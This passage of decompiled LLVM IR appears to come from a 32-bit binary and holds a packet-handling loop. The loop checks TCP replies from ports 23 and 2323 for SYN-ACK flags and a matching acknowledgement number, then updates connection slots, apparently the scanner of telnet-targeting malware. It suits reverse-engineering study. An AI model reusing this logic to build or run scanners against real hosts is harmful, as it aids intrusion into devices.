  %v2_804e640 = add i32 %v1_804e640, -4
  %v3_804e640 = inttoptr i32 %v2_804e640 to i32*
  store i32 %v0_804e640, i32* %v3_804e640, align 4
  %v0_804e641 = load i32, i32* @edi, align 4
  %v2_804e641 = add i32 %v1_804e640, -8
  %v3_804e641 = inttoptr i32 %v2_804e641 to i32*
  store i32 %v0_804e641, i32* %v3_804e641, align 4
  %v1_804e642 = add i32 %v1_804e640, -12
  %v2_804e642 = inttoptr i32 %v1_804e642 to i32*
  store i32 0, i32* %v2_804e642, align 4
  %v1_804e644 = add i32 %v1_804e640, -16
  %v2_804e644 = inttoptr i32 %v1_804e644 to i32*
  store i32 0, i32* %v2_804e644, align 4
  %v1_804e646 = add i32 %v1_804e640, -20
  %v2_804e646 = inttoptr i32 %v1_804e646 to i32*
  store i32 16384, i32* %v2_804e646, align 4
  %v1_804e64b = add i32 %v1_804e640, -24
  %v2_804e64b = inttoptr i32 %v1_804e64b to i32*
  store i32 1514, i32* %v2_804e64b, align 4
  %v0_804e650 = load i32, i32* @global_var_805441c.17, align 4
  store i32 %v0_804e650, i32* %esi.global-to-local, align 4
  %v1_804e656 = add i32 %v1_804e640, 58
  store i32 %v1_804e656, i32* %edx.global-to-local, align 4
  %v2_804e65a = add i32 %v1_804e640, -28
  %v3_804e65a = inttoptr i32 %v2_804e65a to i32*
  store i32 %v1_804e656, i32* %v3_804e65a, align 4
  %v0_804e65b = load i32, i32* %esi.global-to-local, align 4
  %v2_804e65b = add i32 %v1_804e640, -32
  %v3_804e65b = inttoptr i32 %v2_804e65b to i32*
  store i32 %v0_804e65b, i32* %v3_804e65b, align 4
  %v0_804e65c = call i32 @function_8050923()
  store i32 %v0_804e65c, i32* %eax.global-to-local, align 4
  %v0_804e661 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_804e65c, 1
  br i1 %tmp, label %dec_label_pc_804e746, label %dec_label_pc_804e66c

dec_label_pc_804e66c:                             ; preds = %dec_label_pc_804e636
  %v1_804e66c = add i32 %v0_804e661, 72
  %v2_804e66c = inttoptr i32 %v1_804e66c to i32*
  %v3_804e66c = load i32, i32* %v2_804e66c, align 4
  store i32 %v3_804e66c, i32* %ecx.global-to-local, align 4
  %v1_804e670 = inttoptr i32 %v3_804e66c to i32*
  %v2_804e670 = load i32, i32* %v1_804e670, align 4
  %v11_804e670 = icmp eq i32 %v2_804e670, 11
  br i1 %v11_804e670, label %dec_label_pc_804e746, label %dec_label_pc_804e679

dec_label_pc_804e679:                             ; preds = %dec_label_pc_804e66c
  %tmp265 = icmp ult i32 %v0_804e65c, 40
  br i1 %tmp265, label %dec_label_pc_804e636, label %dec_label_pc_804e67e

dec_label_pc_804e67e:                             ; preds = %dec_label_pc_804e679
  %v1_804e67e = add i32 %v0_804e661, 106
  %v2_804e67e = inttoptr i32 %v1_804e67e to i32*
  %v3_804e67e = load i32, i32* %v2_804e67e, align 4
  store i32 %v3_804e67e, i32* %eax.global-to-local, align 4
  %v1_804e682 = load i32, i32* @global_var_80543fc.19, align 4
  %v12_804e682 = icmp eq i32 %v3_804e67e, %v1_804e682
  %v1_804e688 = icmp eq i1 %v12_804e682, false
  br i1 %v1_804e688, label %dec_label_pc_804e636, label %dec_label_pc_804e68a

dec_label_pc_804e68a:                             ; preds = %dec_label_pc_804e67e
  %v1_804e68a = add i32 %v0_804e661, 99
  %v2_804e68a = inttoptr i32 %v1_804e68a to i8*
  %v3_804e68a = load i8, i8* %v2_804e68a, align 1
  %v12_804e68a = icmp eq i8 %v3_804e68a, 6
  %v1_804e68f = icmp eq i1 %v12_804e68a, false
  br i1 %v1_804e68f, label %dec_label_pc_804e636, label %dec_label_pc_804e691

dec_label_pc_804e691:                             ; preds = %dec_label_pc_804e68a
  %v1_804e691 = add i32 %v0_804e661, 110
  %v2_804e691 = inttoptr i32 %v1_804e691 to i32*
  %v3_804e691 = load i32, i32* %v2_804e691, align 4
  store i32 %v3_804e691, i32* %esi.global-to-local, align 4
  %v1_804e695 = trunc i32 %v3_804e691 to i16
  %v7_804e695 = icmp ne i16 %v1_804e695, 5888
  %v10_804e69c = icmp eq i16 %v1_804e695, 4873
  %v1_804e6a1 = icmp eq i1 %v10_804e69c, false
  %or.cond141 = and i1 %v7_804e695, %v1_804e6a1
  br i1 %or.cond141, label %dec_label_pc_804e636, label %dec_label_pc_804e6a3

dec_label_pc_804e6a3:                             ; preds = %dec_label_pc_804e691
  %v1_804e6a3 = add i32 %v0_804e661, 54
  %v2_804e6a3 = inttoptr i32 %v1_804e6a3 to i16*
  %v3_804e6a3 = load i16, i16* %v2_804e6a3, align 2
  %v4_804e6a3 = zext i16 %v3_804e6a3 to i32
  %v6_804e6a3 = and i32 %v3_804e67e, -65536
  %v7_804e6a3 = or i32 %v4_804e6a3, %v6_804e6a3
  store i32 %v7_804e6a3, i32* %eax.global-to-local, align 4
  %v3_804e6a8 = add i32 %v0_804e661, 112
  %v4_804e6a8 = inttoptr i32 %v3_804e6a8 to i16*
  %v5_804e6a8 = load i16, i16* %v4_804e6a8, align 2
  %v16_804e6a8 = icmp eq i16 %v3_804e6a3, %v5_804e6a8
  %v1_804e6ad = icmp eq i1 %v16_804e6a8, false
  br i1 %v1_804e6ad, label %dec_label_pc_804e636, label %dec_label_pc_804e6af

dec_label_pc_804e6af:                             ; preds = %dec_label_pc_804e6a3
  %v1_804e6af = add i32 %v0_804e661, 123
  %v2_804e6af = inttoptr i32 %v1_804e6af to i8*
  %v3_804e6af = load i8, i8* %v2_804e6af, align 1
  %v4_804e6af = zext i8 %v3_804e6af to i32
  %v6_804e6af = and i32 %v7_804e6a3, -256
  %v7_804e6af = or i32 %v4_804e6af, %v6_804e6af
  store i32 %v7_804e6af, i32* %eax.global-to-local, align 4
  %v2_804e6b3 = and i8 %v3_804e6af, 2
  %v3_804e6b3 = icmp eq i8 %v2_804e6b3, 0
  %v2_804e6bb = and i32 %v4_804e6af, 16
  %v3_804e6bb = icmp eq i32 %v2_804e6bb, 0
  %or.cond142 = or i1 %v3_804e6b3, %v3_804e6bb
  br i1 %or.cond142, label %dec_label_pc_804e636, label %dec_label_pc_804e6c3

dec_label_pc_804e6c3:                             ; preds = %dec_label_pc_804e6af
  %v2_804e6c3 = and i32 %v4_804e6af, 4
  %v3_804e6c3 = icmp eq i32 %v2_804e6c3, 0
  %v1_804e6c5 = icmp eq i1 %v3_804e6c3, false
  br i1 %v1_804e6c5, label %dec_label_pc_804e636, label %dec_label_pc_804e6cb

dec_label_pc_804e6cb:                             ; preds = %dec_label_pc_804e6c3
  %tmp272 = urem i8 %v3_804e6af, 2
  %v3_804e6cb = icmp eq i8 %tmp272, 0
  %v1_804e6cd = icmp eq i1 %v3_804e6cb, false
  br i1 %v1_804e6cd, label %dec_label_pc_804e636, label %dec_label_pc_804e6d3

dec_label_pc_804e6d3:                             ; preds = %dec_label_pc_804e6cb
  %v1_804e6d3 = add i32 %v0_804e661, 118
  %v2_804e6d3 = inttoptr i32 %v1_804e6d3 to i32*
  %v3_804e6d3 = load i32, i32* %v2_804e6d3, align 4
  %v1_804e6d7 = trunc i32 %v3_804e6d3 to i16
  %v2_804e6d7 = call i16 @llvm.bswap.i16(i16 %v1_804e6d7)
  %v3_804e6d7 = zext i16 %v2_804e6d7 to i32
  %v1_804e6db = udiv i32 %v3_804e6d3, 65536
  %v2_804e6db = mul nuw i32 %v3_804e6d7, 65536
  %v1_804e6de = trunc i32 %v1_804e6db to i16
  %v2_804e6de = call i16 @llvm.bswap.i16(i16 %v1_804e6de)
  %v3_804e6de = zext i16 %v2_804e6de to i32
  %v6_804e6de = or i32 %v3_804e6de, %v2_804e6db
  store i32 %v6_804e6de, i32* %eax.global-to-local, align 4
  %v1_804e6e2 = add i32 %v6_804e6de, -1
  %v1_804e6e5 = trunc i32 %v1_804e6e2 to i16
  %v2_804e6e5 = call i16 @llvm.bswap.i16(i16 %v1_804e6e5)
  %v3_804e6e5 = zext i16 %v2_804e6e5 to i32
  %v1_804e6e9 = udiv i32 %v1_804e6e2, 65536
  %v2_804e6e9 = mul nuw i32 %v3_804e6e5, 65536
  %v1_804e6ec = trunc i32 %v1_804e6e9 to i16
  %v2_804e6ec = call i16 @llvm.bswap.i16(i16 %v1_804e6ec)
  %v3_804e6ec = zext i16 %v2_804e6ec to i32
  %v6_804e6ec = or i32 %v3_804e6ec, %v2_804e6e9
  store i32 %v6_804e6ec, i32* %edx.global-to-local, align 4
  %v1_804e6f0 = add i32 %v0_804e661, 102
  %v2_804e6f0 = inttoptr i32 %v1_804e6f0 to i32*
  %v3_804e6f0 = load i32, i32* %v2_804e6f0, align 4
  %v15_804e6f0 = icmp eq i32 %v3_804e6f0, %v6_804e6ec
  %v1_804e6f4 = icmp eq i1 %v15_804e6f0, false
  br i1 %v1_804e6f4, label %dec_label_pc_804e636, label %dec_label_pc_804e6fa

dec_label_pc_804e6fa:                             ; preds = %dec_label_pc_804e6d3
  %v0_804e6fa = load i32, i32* @ebx, align 4
  %v1_804e6fa = add i32 %v0_804e6fa, -255
  %v6_804e6fa = sub i32 254, %v0_804e6fa
  %v7_804e6fa = and i32 %v6_804e6fa, %v0_804e6fa
  %v8_804e6fa = icmp slt i32 %v7_804e6fa, 0
  %v9_804e6fa = icmp eq i32 %v1_804e6fa, 0
  %v10_804e6fa = icmp slt i32 %v1_804e6fa, 0
  %v3_804e700 = icmp eq i1 %v10_804e6fa, %v8_804e6fa
  %v4_804e700 = icmp eq i1 %v9_804e6fa, false
  %v5_804e700 = and i1 %v4_804e700, %v3_804e700
  br i1 %v5_804e700, label %dec_label_pc_804e746, label %dec_label_pc_804e702

dec_label_pc_804e702:                             ; preds = %dec_label_pc_804e6fa
  %v0_804e705 = load i32, i32* @global_var_8054418.21, align 8
  store i32 %v0_804e705, i32* %ecx.global-to-local, align 4
  %v2_804e70b = mul i32 %v0_804e6fa, 288
  %v2_804e70e = add i32 %v0_804e705, %v2_804e70b
  store i32 %v2_804e70e, i32* @eax, align 4
  %v1_804e710 = add i32 %v2_804e70e, 12
  %v2_804e710 = inttoptr i32 %v1_804e710 to i32*
  %v3_804e710 = load i32, i32* %v2_804e710, align 4
  %v1_804e713 = add i32 %v2_804e70e, 288
  store i32 %v1_804e713, i32* %ecx.global-to-local, align 4
  %v1_804e719 = icmp eq i32 %v3_804e710, 0
  br i1 %v1_804e719, label %dec_label_pc_804e735, label %dec_label_pc_804e71d

dec_label_pc_804e71d:                             ; preds = %dec_label_pc_804e702, %dec_label_pc_804e726
  %v0_804e726 = phi i32 [ %v1_804e728, %dec_label_pc_804e726 ], [ %v1_804e713, %dec_label_pc_804e702 ]
  %v0_804e71d = phi i32 [ %v1_804e71d, %dec_label_pc_804e726 ], [ %v0_804e6fa, %dec_label_pc_804e702 ]
  %v1_804e71d = add i32 %v0_804e71d, 1
  store i32 %v1_804e71d, i32* @ebx, align 4
  %v6_804e71e = icmp eq i32 %v0_804e71d, 255
  br i1 %v6_804e71e, label %dec_label_pc_804e746, label %dec_label_pc_804e726

dec_label_pc_804e726:                             ; preds = %dec_label_pc_804e71d
  store i32 %v0_804e726, i32* @eax, align 4
  %v1_804e728 = add i32 %v0_804e726, 288
  store i32 %v1_804e728, i32* %ecx.global-to-local, align 4
  %v1_804e72e = add i32 %v0_804e726, 12
  %v2_804e72e = inttoptr i32 %v1_804e72e to i32*
  %v3_804e72e = load i32, i32* %v2_804e72e, align 4
  store i32 %v3_804e72e, i32* @edi, align 4
  %v1_804e731 = icmp eq i32 %v3_804e72e, 0
  %v1_804e733 = icmp eq i1 %v1_804e731, false
  br i1 %v1_804e733, label %dec_label_pc_804e71d, label %dec_label_pc_804e735

dec_label_pc_804e735:                             ; preds = %dec_label_pc_804e726, %dec_label_pc_804e702
  %v1_804e735 = phi i32 [ %v2_804e70e, %dec_label_pc_804e702 ], [ %v0_804e726, %dec_label_pc_804e726 ]
  %v2_804e735 = add i32 %v1_804e735, 16
  %v3_804e735 = inttoptr i32 %v2_804e735 to i32*
  store i32 %v6_804e6ec, i32* %v3_804e735, align 4
  %v0_804e738 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e738 = trunc i32 %v0_804e738 to i16
  %v2_804e738 = load i32, i32* @eax, align 4
  %v3_804e738 = add i32 %v2_804e738, 20
  %v4_804e738 = inttoptr i32 %v3_804e738 to i16*
  store i16 %v1_804e738, i16* %v4_804e738, align 2
  %v0_804e73c = call i32 @function_804ddf0()
  store i32 %v0_804e73c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e636

dec_label_pc_804e746:                             ; preds = %dec_label_pc_804e6fa, %dec_label_pc_804e66c, %dec_label_pc_804e636, %dec_label_pc_804e71d
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804e74f = add i32 %v0_804e661, 44
  %v2_804e74f = inttoptr i32 %v1_804e74f to i32*
  %v3_804e74f = load i32, i32* %v2_804e74f, align 4
  %v4_804e74f = inttoptr i32 %v3_804e74f to i8*
  %v5_804e754 = call i8* @_memset(i8* %v4_804e74f, i32 0, i32 32)
  %v0_804e756 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804e756, i32* %ecx.global-to-local, align 4
  %v0_804e758 = load i32, i32* @esp, align 4
  %v1_804e758 = add i32 %v0_804e758, 8
  %v2_804e758 = inttoptr i32 %v1_804e758 to i32*
  %v3_804e758 = load i32, i32* %v2_804e758, align 4
  %v4_804e758 = inttoptr i32 %v3_804e758 to i8*
  store i1 false, i1* @df, align 1
  %v2_804e75d = load i32, i32* %eax.global-to-local, align 4
  %v5_804e75d = call i8* @_memset(i8* %v4_804e758, i32 %v2_804e75d, i32 %v0_804e756)
  %v6_804e75d = ptrtoint i8* %v5_804e75d to i32
  store i32 %v6_804e75d, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804e763 = load i32, i32* @esp, align 4
  %v1_804e763 = add i32 %v0_804e763, 1868
  %v2_804e763 = inttoptr i32 %v1_804e763 to i32*
  store i32 0, i32* %v2_804e763, align 4
  %v0_804e7ad.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e7ad

dec_label_pc_804e770:                             ; preds = %dec_label_pc_804e7c7
  store i32 %v1_804e7c2, i32* %edx.global-to-local, align 4
  %v1_804e81f = add i32 %v2_804e7bd, 4
  %v2_804e81f = inttoptr i32 %v1_804e81f to i32*
  %v3_804e81f = load i32, i32* %v2_804e81f, align 4
  %v1_804e824 = urem i32 %v3_804e81f, 32
  store i32 %v1_804e824, i32* %eax.global-to-local, align 4
  %v2_804e827 = udiv i32 %v3_804e81f, 32
  store i32 %v2_804e827, i32* %edx.global-to-local, align 4
  %v0_804e82a = load i32, i32* @esp, align 4
  %v2_804e82a = mul nuw nsw i32 %v2_804e827, 4
  br i1 %v9_804e7c2, label %dec_label_pc_804e81f, label %dec_label_pc_804e777

dec_label_pc_804e777:                             ; preds = %dec_label_pc_804e770
  %v3_804e782 = add nuw nsw i32 %v2_804e82a, 1700
  %v4_804e782 = add i32 %v3_804e782, %v0_804e82a
  %v5_804e782 = inttoptr i32 %v4_804e782 to i32*
  %v6_804e782 = load i32, i32* %v5_804e782, align 4
  %v9_804e782 = shl i32 1, %v1_804e824
  %v12_804e782 = or i32 %v6_804e782, %v9_804e782
  store i32 %v12_804e782, i32* %v5_804e782, align 4
  %v0_804e78a = load i32, i32* @ebx, align 4
  %v1_804e78a = add i32 %v0_804e78a, 4
  %v2_804e78a = inttoptr i32 %v1_804e78a to i32*
  %v3_804e78a = load i32, i32* %v2_804e78a, align 4
  store i32 %v3_804e78a, i32* %eax.global-to-local, align 4
  %v0_804e78d = load i32, i32* @edi, align 4
  %v2_804e78d = sub i32 %v0_804e78d, %v3_804e78a
  %v8_804e78d = xor i32 %v0_804e78d, %v3_804e78a
  %v9_804e78d = xor i32 %v2_804e78d, %v0_804e78d
  %v10_804e78d = and i32 %v9_804e78d, %v8_804e78d
  %v11_804e78d = icmp slt i32 %v10_804e78d, 0
  %v13_804e78d = icmp slt i32 %v2_804e78d, 0
  %v2_804e78f = icmp eq i1 %v13_804e78d, %v11_804e78d
  br i1 %v2_804e78f, label %dec_label_pc_804e793, label %dec_label_pc_804e791

dec_label_pc_804e791:                             ; preds = %dec_label_pc_804e777
  store i32 %v3_804e78a, i32* @edi, align 4
  br label %dec_label_pc_804e793

dec_label_pc_804e793:                             ; preds = %dec_label_pc_804e81f, %dec_label_pc_804e813, %dec_label_pc_804e777, %dec_label_pc_804f4c0, %dec_label_pc_804e83d, %dec_label_pc_804e80a, %dec_label_pc_804e791
  %v0_804e793 = load i32, i32* @esp, align 4
  %v1_804e793 = add i32 %v0_804e793, 1868
  %v2_804e793 = inttoptr i32 %v1_804e793 to i32*
  %v3_804e793 = load i32, i32* %v2_804e793, align 4
  %v1_804e79a = add i32 %v3_804e793, 1
  store i32 %v1_804e79a, i32* %eax.global-to-local, align 4
  store i32 %v1_804e79a, i32* %v2_804e793, align 4
  %v0_804e7a2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7a2 = add i32 %v0_804e7a2, -255
  %v6_804e7a2 = sub i32 254, %v0_804e7a2
  %v7_804e7a2 = and i32 %v6_804e7a2, %v0_804e7a2
  %v8_804e7a2 = icmp slt i32 %v7_804e7a2, 0
  %v9_804e7a2 = icmp eq i32 %v1_804e7a2, 0
  %v10_804e7a2 = icmp slt i32 %v1_804e7a2, 0
  %v3_804e7a7 = icmp eq i1 %v10_804e7a2, %v8_804e7a2
  %v4_804e7a7 = icmp eq i1 %v9_804e7a2, false
  %v5_804e7a7 = and i1 %v4_804e7a7, %v3_804e7a7
  br i1 %v5_804e7a7, label %dec_label_pc_804e85f, label %dec_label_pc_804e7ad

dec_label_pc_804e7ad:                             ; preds = %dec_label_pc_804e793, %dec_label_pc_804e746
  %v0_804e7ad = phi i32 [ %v0_804e7a2, %dec_label_pc_804e793 ], [ %v0_804e7ad.pre, %dec_label_pc_804e746 ]
  %v0_804e7b0 = load i32, i32* @global_var_8054418.21, align 8
  store i32 %v0_804e7b0, i32* %eax.global-to-local, align 4
  %v2_804e7b5 = mul i32 %v0_804e7ad, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_804e7bd = add i32 %v0_804e7b0, %v2_804e7b5
  store i32 %v2_804e7bd, i32* @ebx, align 4
  %v1_804e7bf = add i32 %v2_804e7bd, 12
  %v2_804e7bf = inttoptr i32 %v1_804e7bf to i32*
  %v3_804e7bf = load i32, i32* %v2_804e7bf, align 4
  store i32 %v3_804e7bf, i32* %edx.global-to-local, align 4
  %v1_804e7c2 = add i32 %v3_804e7bf, -1
  %v5_804e7c2 = icmp eq i32 %v3_804e7bf, 0
  %v9_804e7c2 = icmp eq i32 %v1_804e7c2, 0
  %v2_804e7c5 = or i1 %v5_804e7c2, %v9_804e7c2
  br i1 %v2_804e7c5, label %dec_label_pc_804e813, label %dec_label_pc_804e7c7

dec_label_pc_804e7c7:                             ; preds = %dec_label_pc_804e7ad, %dec_label_pc_804e81b
  %v1_804e7d1 = phi i32 [ 30, %dec_label_pc_804e7ad ], [ 5, %dec_label_pc_804e81b ]
  %v0_804e7c7 = load i32, i32* @global_var_80543d0.9, align 16
  store i32 %v0_804e7c7, i32* %eax.global-to-local, align 4
  %v1_804e7cc = add i32 %v2_804e7bd, 8
  %v2_804e7cc = inttoptr i32 %v1_804e7cc to i32*
  %v3_804e7cc = load i32, i32* %v2_804e7cc, align 4
  %v2_804e7cf = sub i32 %v0_804e7c7, %v3_804e7cc
  store i32 %v2_804e7cf, i32* %eax.global-to-local, align 4
  %tmp266 = icmp ugt i32 %v2_804e7cf, %v1_804e7d1
  br i1 %tmp266, label %dec_label_pc_804e7d5, label %dec_label_pc_804e770

dec_label_pc_804e7d5:                             ; preds = %dec_label_pc_804e7c7
  %v0_804e7d5 = load i32, i32* @esp, align 4
  %v1_804e7d8 = add i32 %v2_804e7bd, 4
  %v2_804e7d8 = inttoptr i32 %v1_804e7d8 to i32*
  %v3_804e7d8 = load i32, i32* %v2_804e7d8, align 4
  %v2_804e7db = add i32 %v0_804e7d5, -16
  %v3_804e7db = inttoptr i32 %v2_804e7db to i32*
  store i32 %v3_804e7d8, i32* %v3_804e7db, align 4
  %v1_804e7dc = call i32 @function_8050233(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e7dc, i32* %eax.global-to-local, align 4
  %v0_804e7e4 = load i32, i32* @ebx, align 4
  %v1_804e7e4 = add i32 %v0_804e7e4, 4
  %v2_804e7e4 = inttoptr i32 %v1_804e7e4 to i32*
  store i32 -1, i32* %v2_804e7e4, align 4
  %v0_804e7eb = load i32, i32* @ebx, align 4
  %v1_804e7eb = add i32 %v0_804e7eb, 12
  %v2_804e7eb = inttoptr i32 %v1_804e7eb to i32*
  %v3_804e7eb = load i32, i32* %v2_804e7eb, align 4
  %tmp267 = icmp ult i32 %v3_804e7eb, 3
  br i1 %tmp267, label %dec_label_pc_804f4c0, label %dec_label_pc_804e7f5

dec_label_pc_804e7f5:                             ; preds = %dec_label_pc_804e7d5
  %v1_804e7f5 = add i32 %v0_804e7eb, 284
  %v2_804e7f5 = inttoptr i32 %v1_804e7f5 to i8*
  %v3_804e7f5 = load i8, i8* %v2_804e7f5, align 1
  %v4_804e7f5 = zext i8 %v3_804e7f5 to i32
  %v6_804e7f5 = and i32 %v1_804e7dc, -256
  %v7_804e7f5 = or i32 %v4_804e7f5, %v6_804e7f5
  %v1_804e7fb = add i32 %v7_804e7f5, 1
  %v10_804e7fb = trunc i32 %v1_804e7fb to i8
  store i32 %v1_804e7fb, i32* %eax.global-to-local, align 4
  store i8 %v10_804e7fb, i8* %v2_804e7f5, align 1
  %v0_804e802 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e802 = trunc i32 %v0_804e802 to i8
  %v10_804e802 = icmp eq i8 %v1_804e802, 10
  %v0_804f4c0.pre = load i32, i32* @ebx, align 4
  br i1 %v10_804e802, label %dec_label_pc_804f4c0, label %dec_label_pc_804e80a

dec_label_pc_804e80a:                             ; preds = %dec_label_pc_804e7f5
  store i32 %v0_804f4c0.pre, i32* @eax, align 4
  %v0_804e80c = call i32 @function_804ddf0()
  store i32 %v0_804e80c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e793

dec_label_pc_804e813:                             ; preds = %dec_label_pc_804e7ad
  br i1 %v5_804e7c2, label %dec_label_pc_804e793, label %dec_label_pc_804e81b

dec_label_pc_804e81b:                             ; preds = %dec_label_pc_804e813
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e7c7

dec_label_pc_804e81f:                             ; preds = %dec_label_pc_804e770
  %v3_804e82a = add nuw nsw i32 %v2_804e82a, 1572
  %v4_804e82a = add i32 %v3_804e82a, %v0_804e82a
  %v5_804e82a = inttoptr i32 %v4_804e82a to i32*
  %v6_804e82a = load i32, i32* %v5_804e82a, align 4
  %v9_804e82a = shl i32 1, %v1_804e824
  %v12_804e82a = or i32 %v6_804e82a, %v9_804e82a
  store i32 %v12_804e82a, i32* %v5_804e82a, align 4
  %v0_804e832 = load i32, i32* @ebx, align 4
  %v1_804e832 = add i32 %v0_804e832, 4
  %v2_804e832 = inttoptr i32 %v1_804e832 to i32*
  %v3_804e832 = load i32, i32* %v2_804e832, align 4
  store i32 %v3_804e832, i32* %eax.global-to-local, align 4
  %v0_804e835 = load i32, i32* @esi, align 4
  %v2_804e835 = sub i32 %v0_804e835, %v3_804e832
  %v8_804e835 = xor i32 %v0_804e835, %v3_804e832
  %v9_804e835 = xor i32 %v2_804e835, %v0_804e835
  %v10_804e835 = and i32 %v9_804e835, %v8_804e835
  %v11_804e835 = icmp slt i32 %v10_804e835, 0
  %v13_804e835 = icmp slt i32 %v2_804e835, 0
  %v2_804e837 = icmp eq i1 %v13_804e835, %v11_804e835
  br i1 %v2_804e837, label %dec_label_pc_804e793, label %dec_label_pc_804e83d

dec_label_pc_804e83d:                             ; preds = %dec_label_pc_804e81f
  store i32 %v3_804e832, i32* @esi, align 4
  br label %dec_label_pc_804e793

dec_label_pc_804e85f:                             ; preds = %dec_label_pc_804e793
  %v0_804e85f = load i32, i32* @esp, align 4
  %v1_804e85f = add i32 %v0_804e85f, 1860
  %v2_804e85f = inttoptr i32 %v1_804e85f to i32*
  store i32 0, i32* %v2_804e85f, align 4
  %v0_804e86a = load i32, i32* @esp, align 4
  %v1_804e86a = add i32 %v0_804e86a, 1856
  %v2_804e86a = inttoptr i32 %v1_804e86a to i32*
  store i32 1, i32* %v2_804e86a, align 4
  %v0_804e875 = load i32, i32* @esp, align 4
  %v0_804e878 = load i32, i32* @edi, align 4
  %v1_804e878 = load i32, i32* @esi, align 4
  %v2_804e878 = sub i32 %v0_804e878, %v1_804e878
  %v8_804e878 = xor i32 %v1_804e878, %v0_804e878
  %v9_804e878 = xor i32 %v2_804e878, %v0_804e878
  %v10_804e878 = and i32 %v9_804e878, %v8_804e878
  %v11_804e878 = icmp slt i32 %v10_804e878, 0
  %v13_804e878 = icmp slt i32 %v2_804e878, 0
  %v1_804e87a = add i32 %v0_804e875, 1856
  %v2_804e881 = add i32 %v0_804e875, -16
  %v3_804e881 = inttoptr i32 %v2_804e881 to i32*
  store i32 %v1_804e87a, i32* %v3_804e881, align 4
  %v1_804e882 = add i32 %v0_804e875, -20
  %v2_804e882 = inttoptr i32 %v1_804e882 to i32*
  store i32 0, i32* %v2_804e882, align 4
  %v1_804e884 = add i32 %v0_804e875, 1572
  store i32 %v1_804e884, i32* %edx.global-to-local, align 4
  %v0_804e88b = load i32, i32* @edi, align 4
  store i32 %v0_804e88b, i32* %eax.global-to-local, align 4
  %v2_804e88d = add i32 %v0_804e875, -24
  %v3_804e88d = inttoptr i32 %v2_804e88d to i32*
  store i32 %v1_804e884, i32* %v3_804e88d, align 4
  %v1_804e88e = add i32 %v0_804e875, 1700
  store i32 %v1_804e88e, i32* %ecx.global-to-local, align 4
  %v2_804e895 = add i32 %v0_804e875, -28
  %v3_804e895 = inttoptr i32 %v2_804e895 to i32*
  store i32 %v1_804e88e, i32* %v3_804e895, align 4
  %v2_804e896 = icmp eq i1 %v13_804e878, %v11_804e878
  br i1 %v2_804e896, label %dec_label_pc_804e85f.dec_label_pc_804e89a_crit_edge, label %dec_label_pc_804e898

dec_label_pc_804e85f.dec_label_pc_804e89a_crit_edge: ; preds = %dec_label_pc_804e85f
  %v0_804e89a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e89a

dec_label_pc_804e898:                             ; preds = %dec_label_pc_804e85f
  %v0_804e898 = load i32, i32* @esi, align 4
  store i32 %v0_804e898, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e89a

dec_label_pc_804e89a:                             ; preds = %dec_label_pc_804e85f.dec_label_pc_804e89a_crit_edge, %dec_label_pc_804e898
  %v0_804e89a = phi i32 [ %v0_804e89a.pre, %dec_label_pc_804e85f.dec_label_pc_804e89a_crit_edge ], [ %v0_804e898, %dec_label_pc_804e898 ]
  %v1_804e89a = add i32 %v0_804e89a, 1
  store i32 %v1_804e89a, i32* %eax.global-to-local, align 4
  %v2_804e89b = add i32 %v0_804e875, -32
  %v3_804e89b = inttoptr i32 %v2_804e89b to i32*
  store i32 %v1_804e89a, i32* %v3_804e89b, align 4
  %v0_804e89c = call i32 @function_805043a()
  store i32 %v0_804e89c, i32* %eax.global-to-local, align 4
  %v0_804e8a1 = load i32, i32* @esp, align 4
  %v1_804e8a4 = add i32 %v0_804e8a1, 16
  %v2_804e8a4 = inttoptr i32 %v1_804e8a4 to i32*
  store i32 0, i32* %v2_804e8a4, align 4
  %v0_804e8a6 = call i32 @function_80504f4()
  %v0_804e8ab = load i32, i32* @esp, align 4
  %v1_804e8ab = add i32 %v0_804e8ab, 1884
  %v2_804e8ab = inttoptr i32 %v1_804e8ab to i32*
  store i32 0, i32* %v2_804e8ab, align 4
  store i32 %v0_804e8a6, i32* @global_var_80543d0.9, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8f7

dec_label_pc_804e8c2:                             ; preds = %dec_label_pc_804e90d, %dec_label_pc_804f46b
  %v0_804e8ca = phi i32 [ %v0_804e917, %dec_label_pc_804e90d ], [ %v0_804e8ca.pre, %dec_label_pc_804f46b ]
  %v0_804e8c2 = phi i32 [ %v3_804e905, %dec_label_pc_804e90d ], [ %v0_804e8c2.pre, %dec_label_pc_804f46b ]
  %v2_804e8c4 = udiv i32 %v0_804e8c2, 32
  store i32 %v2_804e8c4, i32* %ecx.global-to-local, align 4
  %v1_804e8c7 = urem i32 %v0_804e8c2, 32
  store i32 %v1_804e8c7, i32* %eax.global-to-local, align 4
  %v2_804e8ca = mul nuw nsw i32 %v2_804e8c4, 4
  %v3_804e8ca = add i32 %v0_804e8ca, 1700
  %v4_804e8ca = add i32 %v3_804e8ca, %v2_804e8ca
  %v5_804e8ca = inttoptr i32 %v4_804e8ca to i32*
  %v6_804e8ca = load i32, i32* %v5_804e8ca, align 4
  %v9_804e8ca = shl i32 1, %v1_804e8c7
  %v10_804e8ca = and i32 %v6_804e8ca, %v9_804e8ca
  %v11_804e8ca = icmp ne i32 %v10_804e8ca, 0
  %v1_804e8d2 = zext i1 %v11_804e8ca to i32
  store i32 %v1_804e8d2, i32* %eax.global-to-local, align 4
  %v4_804e8d5 = icmp eq i1 %v11_804e8ca, false
  %v1_804e8d7 = icmp eq i1 %v4_804e8d5, false
  br i1 %v1_804e8d7, label %dec_label_pc_804e9cc.preheader, label %dec_label_pc_804e8dd

